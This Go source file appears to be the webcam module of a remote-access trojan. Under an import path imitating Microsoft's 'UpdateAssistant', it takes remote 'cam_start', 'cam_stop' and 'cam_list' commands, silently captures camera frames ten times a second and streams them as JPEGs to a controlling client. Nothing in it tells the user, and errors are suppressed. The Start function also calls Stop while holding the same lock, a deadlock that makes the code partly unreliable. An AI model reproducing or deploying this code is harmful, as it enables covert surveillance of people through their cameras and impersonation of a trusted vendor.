//go:build windows

package webcam

import (
    "bytes"
    "encoding/json"
    "image"
    "image/jpeg"
    "sync"
    "time"

    "github.com/microsoft/UpdateAssistant/modules/logger"
    "github.com/microsoft/UpdateAssistant/modules/sysutil"
    "github.com/microsoft/UpdateAssistant/modules/transport"
)

type outPkt struct {
    msgType string
    data    []byte
}

type Session struct {
    mu      sync.Mutex
    stopCh  chan struct{}
    wg      sync.WaitGroup
    camW    int
    camH    int
    camOn   bool
}

var (
    sessMu sync.Mutex
    cur    *Session
)

func bgraToRgba(src, dst []byte, w, h int) {
    n := w * h * 4
    for i := 0; i < n; i += 4 {
        dst[i] = src[i+2]
        dst[i+1] = src[i+1]
        dst[i+2] = src[i]
        dst[i+3] = 255
    }
}

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
    switch msgType {
    case "cam_start":
        var p struct {
            DeviceID int `json:"device_id"`
        }
        if json.Unmarshal(payload, &p) != nil {
            return
        }
        Start(client, p.DeviceID)
    case "cam_stop":
        Stop()
    case "cam_list":
        devices := sysutil.CamList()
        client.Send("cam_devices", devices)
    }
}

func Start(client *transport.Client, deviceID int) {
    sessMu.Lock()
    defer sessMu.Unlock()
    if cur != nil {
        Stop()
    }

    ok, w, h := sysutil.CamStart(deviceID)
    if !ok || w == 0 || h == 0 {
        logger.Info("[cam] cam_start failed device=%d", deviceID)
        return
    }

    s := &Session{
        stopCh: make(chan struct{}),
        camW:   w,
        camH:   h,
        camOn:  true,
    }
    cur = s

    outbound := make(chan outPkt, 4)
    s.wg.Add(2)

    go func() {
        defer s.wg.Done()
        defer func() { recover() }()
        for {
            select {
            case <-s.stopCh:
                return
            case pkt := <-outbound:
                client.SendBinary(pkt.msgType, pkt.data)
            }
        }
    }()

    go func() {
        defer s.wg.Done()
        defer func() { recover() }()
        ticker := time.NewTicker(100 * time.Millisecond)
        defer ticker.Stop()
        captureBuf := make([]byte, w*h*4)
        rgbaBuf := make([]byte, w*h*4)
        frameImg := &image.RGBA{Pix: rgbaBuf, Stride: w * 4, Rect: image.Rect(0, 0, w, h)}
        var jb bytes.Buffer
        for {
            select {
            case <-s.stopCh:
                return
            case <-ticker.C:
                n := sysutil.CamPoll(captureBuf)
                if n <= 0 {
                    continue
                }
                bgraToRgba(captureBuf[:n], rgbaBuf, w, h)
                jb.Reset()
                if jpeg.Encode(&jb, frameImg, &jpeg.Options{Quality: 35}) != nil {
                    continue
                }
                data := make([]byte, jb.Len())
                copy(data, jb.Bytes())
                select {
                case outbound <- outPkt{msgType: "cam_frame", data: data}:
                default:
                }
            }
        }
    }()
}

func Stop() {
    sessMu.Lock()
    s := cur
    cur = nil
    sessMu.Unlock()
    if s == nil {
        return
    }
    s.mu.Lock()
    s.camOn = false
    s.mu.Unlock()
    close(s.stopCh)
    s.wg.Wait()
    sysutil.CamStop()
}